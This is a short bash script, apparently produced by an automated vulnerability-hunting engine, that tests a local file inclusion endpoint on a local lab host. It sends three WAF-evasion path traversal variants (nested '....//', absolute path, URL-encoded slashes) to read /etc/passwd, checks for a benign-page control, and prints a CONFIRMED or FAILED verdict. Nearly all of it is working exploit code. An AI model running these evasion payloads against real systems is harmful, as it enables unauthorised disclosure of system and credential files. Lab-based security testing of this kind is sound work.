#!/bin/bash
# explore_traversal.sh — NEW PROCESS (brain-explore-v1, 29 Oct ~19:57 IST).
#
# WHY THIS PROCESS EXISTS (reason, owner refinement #1): the playbook's LFI
# probe confirmed basic ../ inclusion. A real elite hunter's next thought is:
# "naive filters are everywhere — which ENCODING/traversal VARIANTS slip
# past?" Test filter-evasion variants WAFs commonly miss: ....// nesting,
# absolute path, single-URL-encoded slashes.
#
# Self-contained: fixed marker argv, control (benign page shows no passwd),
# fixed VERDICT line LAST (engine VERDICT_RE).
MARKER="${1:-TRV7719-EXP2}"
B="http://172.17.0.1:3100"
P="/vulnerabilities/fi/?page="

echo "TRAVERSAL-EXPLORE-START marker=$MARKER"

# CONTROL: benign include must NOT leak /etc/passwd (oracle is sound).
CTRL=$(curl -s --max-time 25 "${B}${P}include.php")
if echo "$CTRL" | grep -q "root:x:0:0"; then CTRL_LEAK=yes; else CTRL_LEAK=no; fi
echo "CONTROL benign include passwd-leak=$CTRL_LEAK (expect no)"

WORKING=""
# Variant 1: nested traversal (....//....//) — collapses to ../../ after naive strip
R1=$(curl -s --max-time 25 --get --data-urlencode "page=....//....//etc/passwd" "$B/vulnerabilities/fi/")
if echo "$R1" | grep -q "root:x:0:0"; then echo "VARIANT nested-....// LEAKED passwd"; WORKING="$WORKING nested"; else echo "VARIANT nested-....// blocked"; fi

# Variant 2: absolute path (no traversal at all)
R2=$(curl -s --max-time 25 --get --data-urlencode "page=/etc/passwd" "$B/vulnerabilities/fi/")
if echo "$R2" | grep -q "root:x:0:0"; then echo "VARIANT absolute-path LEAKED passwd"; WORKING="$WORKING absolute"; else echo "VARIANT absolute-path blocked"; fi

# Variant 3: URL-encoded slashes (..%2f..%2f) — survives single-decode filters only
R3=$(curl -s --max-time 25 "${B}${P}..%2f..%2fetc%2fpasswd")
if echo "$R3" | grep -q "root:x:0:0"; then echo "VARIANT encoded-slashes LEAKED passwd"; WORKING="$WORKING encoded"; else echo "VARIANT encoded-slashes blocked"; fi

if [ "$CTRL_LEAK" = "no" ] && [ -n "$WORKING" ]; then
  echo "EVIDENCE: /etc/passwd disclosed via filter-evasion variant(s):$WORKING (control clean)"
  echo "VERDICT: CONFIRMED"
else
  echo "REASON: control-leak=$CTRL_LEAK working-variants='$WORKING' — no evasion variant disclosed passwd."
  echo "VERDICT: FAILED"
fi
